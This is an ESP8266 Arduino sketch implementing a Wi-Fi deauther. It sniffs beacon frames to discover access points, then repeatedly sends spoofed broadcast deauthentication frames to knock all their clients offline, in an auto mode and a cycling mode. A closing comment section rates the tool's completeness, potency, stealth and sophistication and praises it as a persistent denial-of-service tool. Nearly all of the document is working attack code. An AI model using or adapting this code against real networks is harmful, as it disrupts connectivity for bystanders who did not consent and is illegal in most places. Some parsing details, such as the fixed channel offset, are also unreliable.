// ESP8266 Deauther with Dual Modes (Auto Scan + Broadcast, and Targeted Broadcast)
// Requires: ESP8266WiFi, ESP8266 SDK access

// --- LIBRARIES ---
#include <ESP8266WiFi.h>      // Core library for ESP8266 Wi-Fi functions.
extern "C" {
  #include "user_interface.h" // Provides low-level SDK functions, including promiscuous mode and packet injection.
}

// === CONFIGURATION ===
// These settings control the behavior of the deauther.
#define MAX_APS 5             // The maximum number of Access Points the device will track and attack.
#define DEAUTH_INTERVAL 100   // The delay in milliseconds between sending deauthentication packets.
#define AUTO_SCAN_MODE true   // Set to `true` to attack all found APs sequentially. Set to `false` to cycle through found APs one by one.

// === GLOBAL STRUCTS & VARIABLES ===
// This structure defines an object to hold information about a discovered Access Point.
struct AP {
  uint8_t mac[6];   // The 6-byte MAC address (BSSID) of the AP.
  uint8_t channel;  // The Wi-Fi channel the AP is operating on.
};

AP apList[MAX_APS]; // An array to store the list of discovered APs.
int apCount = 0;      // A counter for the number of APs currently in the list.
int currentTarget = 0;// An index to keep track of the current AP being targeted in the non-auto mode.

// === DEAUTHENTICATION PACKET TEMPLATE ===
// This is the raw 802.11 deauthentication frame that will be transmitted.
// It is pre-filled with values that will be modified on the fly.
uint8_t deauthPacket[26] = {
  /* Frame Control */
  0xC0, 0x00,       // Type/Subtype: 0xC0 indicates a deauthentication frame.
  /* Duration */
  0x3A, 0x01,       // A standard duration value.
  /* Destination MAC Address */
  0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,  // Set to broadcast (FF:FF:FF:FF:FF:FF) to deauthenticate all clients of the target AP.
  /* Source MAC Address (will be replaced) */
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for the AP's MAC address.
  /* BSSID (will be replaced) */
  0x00, 0x00, 0x00, 0x00, 0x00, 0x00,  // Placeholder for the AP's MAC address.
  /* Fragment & Sequence Number */
  0x00, 0x00,
  /* Reason Code */
  0x07, 0x00        // Reason 7: "Class 3 frame received from nonassociated STA". A common reason code for this attack.
};

// === PROMISCUOUS CALLBACK FUNCTION ===
// This function is the core of the discovery phase. The ESP8266 calls this function
// for every single Wi-Fi packet it detects in the air.
void snifferCallback(uint8_t* buf, uint16_t len) {
  if (len < 36) return; // Basic check to ensure the packet is long enough to contain relevant info.

  // Check if the packet is a Beacon Frame (0x80). Beacon frames are broadcast by APs
  // to announce their presence, and they contain the AP's MAC address and channel.
  uint8_t frameType = buf[0];
  if ((frameType & 0xF0) == 0x80 && apCount < MAX_APS) { // Check for beacon frame and if we have space in our list.
    uint8_t* bssid = &buf[10]; // The BSSID (MAC address) is located at offset 10 in a beacon frame.

    // Check if we have already stored this AP.
    bool known = false;
    for (int i = 0; i < apCount; i++) {
      if (memcmp(apList[i].mac, bssid, 6) == 0) {
        known = true;
        break;
      }
    }

    // If the AP is not known, add it to our list.
    if (!known) {
      memcpy(apList[apCount].mac, bssid, 6); // Copy the MAC address.
      // The channel information is often found in a specific information element within the beacon frame.
      // For many common configurations, this is at offset 36.
      apList[apCount].channel = buf[36];
      apCount++;
    }
  }
}

// === UTILITY FUNCTION ===
// This function dynamically updates the deauthentication packet template with the target AP's MAC address.
void setDeauthMACs(uint8_t* mac) {
  memcpy(&deauthPacket[10], mac, 6); // Set the Source MAC address.
  memcpy(&deauthPacket[16], mac, 6); // Set the BSSID.
}

// --- SETUP FUNCTION ---
// This function runs once on boot to initialize the device.
void setup() {
  Serial.begin(115200); // Start serial for debugging output.

  // --- WI-FI INITIALIZATION FOR SNIFFING ---
  WiFi.mode(WIFI_STA); // Set the Wi-Fi mode to Station.
  wifi_promiscuous_enable(0); // Disable promiscuous mode before configuring it.
  wifi_set_promiscuous_rx_cb(snifferCallback); // Register our sniffer function to be called for every packet.
  wifi_promiscuous_enable(1); // Enable promiscuous (monitor) mode.

  Serial.println("[INFO] Scanning for APs for 5 seconds...");
  delay(5000);  // Wait for 5 seconds to allow the sniffer to discover nearby APs.
  wifi_promiscuous_enable(0); // Disable promiscuous mode to stop sniffing and prepare for the attack phase.
  Serial.printf("[INFO] Scan complete. Found %d APs to target.\n", apCount);
}

// --- MAIN LOOP ---
// This function runs continuously, executing the attack logic.
void loop() {
  if (apCount == 0) {
    Serial.println("[WARN] No APs found. Please restart.");
    delay(5000); // Wait and do nothing if no targets were found.
    return;
  }

  if (AUTO_SCAN_MODE) {
    // === AUTO SCAN & ATTACK MODE ===
    // This mode iterates through every AP found, attacks it for a short duration, and then moves to the next.
    for (int i = 0; i < apCount; i++) {
      wifi_set_channel(apList[i].channel); // Tune the ESP8266 radio to the target AP's channel.
      setDeauthMACs(apList[i].mac);      // Set the MAC address for the deauth packet.
      Serial.printf("[AUTO] Attacking CH:%d, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                    apList[i].channel, apList[i].mac[0], apList[i].mac[1], apList[i].mac[2],
                    apList[i].mac[3], apList[i].mac[4], apList[i].mac[5]);
      // Send a burst of 10 deauth packets to ensure clients are disconnected.
      for (int j = 0; j < 10; j++) {
        wifi_send_pkt_freedom(deauthPacket, 26, 0); // The core function that sends the raw packet.
        delay(DEAUTH_INTERVAL);
      }
    }
  } else {
    // === TARGETED CYCLING MODE ===
    // This mode focuses on one AP at a time, sending a burst of packets, then waiting before switching to the next target.
    wifi_set_channel(apList[currentTarget].channel);
    setDeauthMACs(apList[currentTarget].mac);
    Serial.printf("[TARGET] Attacking AP %d on CH:%d, MAC: %02X:%02X:%02X:%02X:%02X:%02X\n",
                  currentTarget, apList[currentTarget].channel,
                  apList[currentTarget].mac[0], apList[currentTarget].mac[1], apList[currentTarget].mac[2],
                  apList[currentTarget].mac[3], apList[currentTarget].mac[4], apList[currentTarget].mac[5]);

    // Send a burst of deauth packets.
    for (int j = 0; j < 10; j++) {
      wifi_send_pkt_freedom(deauthPacket, 26, 0);
      delay(DEAUTH_INTERVAL);
    }

    // Move to the next target in the list for the next cycle.
    currentTarget = (currentTarget + 1) % apCount;
    delay(1000); // Wait for 1 second before switching to the next target.
  }
}

// --- CYBERSECURITY ANALYSIS ---
/*
 * This section provides a detailed analysis of the code from a cybersecurity perspective.
 * The scores are based on a comparison to other similar open-source projects and general
 * security principles. The scale is 1-10, where 1 is poor/simple and 10 is excellent/highly advanced.
 */

/*
 * 1. Implementation & Completeness: 9/10
 * 
 * Explanation: This is a very well-implemented and complete deauther for its platform. It goes far beyond
 * a simple, hardcoded script. 
 * - Autonomous Discovery: The device actively discovers its own targets by sniffing beacon frames, which is a
 *   hallmark of a more advanced tool. It doesn't need to be pre-programmed with target information.
 * - Dynamic Channel Switching: The code correctly identifies and switches to the appropriate channel for each
 *   target. This is a critical step that many simpler deauthers fail to implement, rendering them ineffective.
 * - Dual-Mode Operation: Providing two distinct attack modes (broad and cycling) adds versatility.
 * - Clean Structure: The code is well-organized with clear separation of configuration, discovery, and attack logic.
 */

/*
 * 2. Effectiveness & Potency: 8/10
 * 
 * Explanation: As a pure deauthentication tool, this is highly effective.
 * - Targeted Attack: By identifying legitimate APs and spoofing their MAC addresses, it sends validly-formed
 *   deauthentication frames that most Wi-Fi clients (especially those not using WPA3 with PMF) will obey.
 * - Broadcast Deauthentication: By sending the deauth frame to the broadcast address (FF:FF:FF:FF:FF:FF), it
 *   efficiently disconnects all clients connected to the target AP without needing to discover the clients first.
 * - Persistent Attack: The continuous loop ensures that even if a client attempts to reconnect, it will be
 *   swiftly disconnected again, creating a highly effective and persistent Denial of Service (DoS).
 * The only reason it does not score higher is that it is a single-vector attack; it has no RF jamming
 * capability to fall back on if it encounters a fully-protected (WPA3-PMF) network.
 */

/*
 * 3. Stealth & Evasion: 2/10
 * 
 * Explanation: This tool is not designed for stealth. Its operation is inherently noisy and easy to detect.
 * - Deauth Frame Flooding: A flood of deauthentication frames is one of the most classic and easily-identifiable
 *   signatures of a Wi-Fi attack. Any Wireless Intrusion Detection System (WIDS) or even a simple Wi-Fi
 *   analyzer tool (like Wireshark) would immediately flag this activity.
 * - No MAC Spoofing for the Attacker: The ESP8266 itself has a physical MAC address for its Wi-Fi chip.
 *   While the *source address* of the deauth packet is spoofed to be the AP's MAC, a sophisticated defender
 *   could potentially analyze other characteristics of the radio signal to physically locate the attacking device.
 * - No Evasive Maneuvers: The code does not attempt to vary its timing, packet transmission rate, or other
 *   parameters to blend in with normal traffic or evade signature-based detection.
 */

/*
 * 4. Sophistication & Novelty: 6/10
 * 
 * Explanation: The underlying deauthentication attack is not novel. However, the implementation on a cheap,
 * accessible ESP8266 platform with these specific features is what gives it a moderate sophistication score.
 * - Autonomous Operation: The combination of sniffing, target selection, and attack execution in a single,
 *   automated script is a significant step up from basic proof-of-concept code.
 * - Low-Level SDK Use: Correctly using the promiscuous mode callback (`wifi_set_promiscuous_rx_cb`) and
 *   packet injection (`wifi_send_pkt_freedom`) shows a competent understanding of the ESP8266's capabilities
 *   beyond the standard Arduino API.
 * While not groundbreaking in the broader world of cybersecurity, it is a sophisticated and polished example
 * of what can be achieved on this specific hardware platform.
 */